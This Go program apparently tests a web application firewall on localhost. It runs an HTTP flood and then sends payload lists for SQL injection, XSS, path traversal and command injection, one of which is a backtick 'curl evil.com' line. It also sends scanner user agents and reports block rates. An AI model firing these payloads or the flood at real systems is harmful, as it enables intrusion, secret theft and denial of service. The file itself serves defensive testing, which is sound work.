// Noxis Shield - Multi-Vector Attack Simulator
// Tests: DDoS Flood, SQL Injection, XSS, Path Traversal, Scanner Detection, Rate Limiting
package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

const target = "http://localhost:8080"

var (
	totalRequests atomic.Int64
	blockedCount  atomic.Int64
	passedCount   atomic.Int64
	wafBlocked    atomic.Int64
	rateLimited   atomic.Int64
)

// Attack vectors organized by type
var sqliPayloads = []string{
	"/?user=admin' OR 1=1--",
	"/?id=1 UNION SELECT * FROM users",
	"/?q=1; DROP TABLE users--",
	"/?search=' OR '1'='1",
	"/?id=1 AND sleep(5)--",
	"/?x=admin' OR '1'='1'--",
}

var xssPayloads = []string{
	"/?q=<script>alert('XSS')</script>",
	"/?name=<img src=x onerror=alert(1)>",
	"/?msg=<iframe src='javascript:alert(1)'></iframe>",
	"/?s=<svg onload=alert(1)>",
	`/?x="><script>document.cookie</script>`,
}

var lfiPayloads = []string{
	"/?file=../../etc/passwd",
	"/?path=../../etc/shadow",
	"/?page=../../../../windows/system32",
	"/.env",
	"/.htaccess",
	"/.git/config",
	"/backup.sql",
}

var rcePayloads = []string{
	"/?cmd=;cat /etc/passwd",
	"/?exec=$(whoami)",
	"/?q=; ls -la",
	"/?x=|id",
	"/?c=`curl evil.com`",
}

var scannerUserAgents = []string{
	"sqlmap/1.7.7",
	"Nikto/2.1.6",
	"nmap/7.93",
	"gobuster/3.5",
	"nuclei/2.9.0",
	"ffuf/2.0.0",
	"dirbuster/1.0",
}

var normalUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
}

func sendRequest(path, ua string, client *http.Client) int {
	req, err := http.NewRequest("GET", target+path, nil)
	if err != nil {
		return 0
	}
	req.Header.Set("User-Agent", ua)

	resp, err := client.Do(req)
	if err != nil {
		totalRequests.Add(1)
		return 0
	}
	defer resp.Body.Close()
	totalRequests.Add(1)

	switch resp.StatusCode {
	case 200:
		passedCount.Add(1)
	case 403:
		wafBlocked.Add(1)
		blockedCount.Add(1)
	case 429:
		rateLimited.Add(1)
		blockedCount.Add(1)
	case 503:
		// JS Challenge - also a successful block
		blockedCount.Add(1)
	}

	return resp.StatusCode
}

func printProgress(stop chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			total := totalRequests.Load()
			blocked := blockedCount.Load()
			blockPct := float64(0)
			if total > 0 {
				blockPct = float64(blocked) / float64(total) * 100
			}
			fmt.Printf("\r📊 Total: %5d | ✅ Passed: %4d | 🔨 WAF 403: %4d | ⏱️ RateLimit: %4d | 🔒 Block Rate: %.1f%%  ",
				total, passedCount.Load(), wafBlocked.Load(), rateLimited.Load(), blockPct)
		}
	}
}

func runAttack(name string, payloads []string, ua string, threads int, duration time.Duration, delay time.Duration) {
	client := &http.Client{Timeout: 3 * time.Second}
	var wg sync.WaitGroup
	done := make(chan struct{})
	startTime := time.Now()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-done:
					return
				default:
					payload := payloads[rand.Intn(len(payloads))]
					sendRequest(payload, ua, client)
					if delay > 0 {
						time.Sleep(delay)
					}
					if time.Since(startTime) > duration {
						return
					}
				}
			}
		}()
	}

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	wg.Wait()
}

func main() {
	fmt.Println("╔════════════════════════════════════════════════════════╗")
	fmt.Println("║     🔥 NOXIS SHIELD - MULTI-VECTOR ATTACK SIMULATOR    ║")
	fmt.Println("╚════════════════════════════════════════════════════════╝")
	fmt.Printf("\n🎯 Target: %s\n\n", target)

	stopProgress := make(chan struct{})
	go printProgress(stopProgress)
	defer close(stopProgress)

	// Phase 1: DDoS HTTP Flood (50 goroutines, 10s)
	fmt.Println("\n\n⚡ [Phase 1] DDoS HTTP Flood — 50 concurrent threads, 10 seconds...")
	runAttack("DDoS Flood", []string{"/"}, normalUserAgents[0], 50, 10*time.Second, 5*time.Millisecond)
	p1Total := totalRequests.Load()
	fmt.Printf("\n   → Phase 1 Done: %d requests fired.\n", p1Total)

	// Phase 2: SQL Injection Storm
	fmt.Println("\n🔴 [Phase 2] SQL Injection Attack Storm...")
	runAttack("SQLi", sqliPayloads, normalUserAgents[0], 5, 5*time.Second, 50*time.Millisecond)
	p2Total := totalRequests.Load()
	fmt.Printf("\n   → Phase 2 Done: %d requests fired.\n", p2Total-p1Total)

	// Phase 3: XSS Attack
	fmt.Println("\n🟠 [Phase 3] Cross-Site Scripting (XSS) Attack...")
	runAttack("XSS", xssPayloads, normalUserAgents[1], 5, 5*time.Second, 50*time.Millisecond)
	p3Total := totalRequests.Load()
	fmt.Printf("\n   → Phase 3 Done: %d requests fired.\n", p3Total-p2Total)

	// Phase 4: LFI / Path Traversal
	fmt.Println("\n🟡 [Phase 4] Local File Inclusion / Path Traversal...")
	runAttack("LFI", lfiPayloads, normalUserAgents[2], 5, 5*time.Second, 50*time.Millisecond)
	p4Total := totalRequests.Load()
	fmt.Printf("\n   → Phase 4 Done: %d requests fired.\n", p4Total-p3Total)

	// Phase 5: Remote Code Execution
	fmt.Println("\n🔵 [Phase 5] Remote Code Execution (RCE) Probes...")
	runAttack("RCE", rcePayloads, normalUserAgents[0], 5, 5*time.Second, 50*time.Millisecond)
	p5Total := totalRequests.Load()
	fmt.Printf("\n   → Phase 5 Done: %d requests fired.\n", p5Total-p4Total)

	// Phase 6: Scanner Fingerprint Evasion
	fmt.Println("\n🟣 [Phase 6] Hacker Scanner Detection (Nikto, SQLMap, Nmap)...")
	for _, scanUA := range scannerUserAgents {
		client := &http.Client{Timeout: 3 * time.Second}
		code := sendRequest("/", scanUA, client)
		fmt.Printf("   → Scanner %s → HTTP %d\n", scanUA, code)
	}

	// Small pause
	time.Sleep(500 * time.Millisecond)

	// Final summary
	total := totalRequests.Load()
	blocked := blockedCount.Load()
	passed := passedCount.Load()
	waf := wafBlocked.Load()
	rl := rateLimited.Load()
	blockPct := float64(0)
	if total > 0 {
		blockPct = float64(blocked) / float64(total) * 100
	}

	fmt.Println("\n\n╔════════════════════════════════════════════════════════╗")
	fmt.Println("║                  ✅ FINAL REPORT                       ║")
	fmt.Println("╠════════════════════════════════════════════════════════╣")
	fmt.Printf("║  🌐 Total Requests fired :  %-28d║\n", total)
	fmt.Printf("║  ✅ Passed (Clean traffic):  %-28d║\n", passed)
	fmt.Printf("║  🔨 WAF Blocked (403)     :  %-28d║\n", waf)
	fmt.Printf("║  ⏱️  Rate Limited (429)    :  %-28d║\n", rl)
	fmt.Printf("║  🛡️  Total Blocked        :  %-28d║\n", blocked)
	fmt.Printf("║  🔒 Block Rate            :  %-26.1f%% ║\n", blockPct)
	fmt.Println("╚════════════════════════════════════════════════════════╝")
}
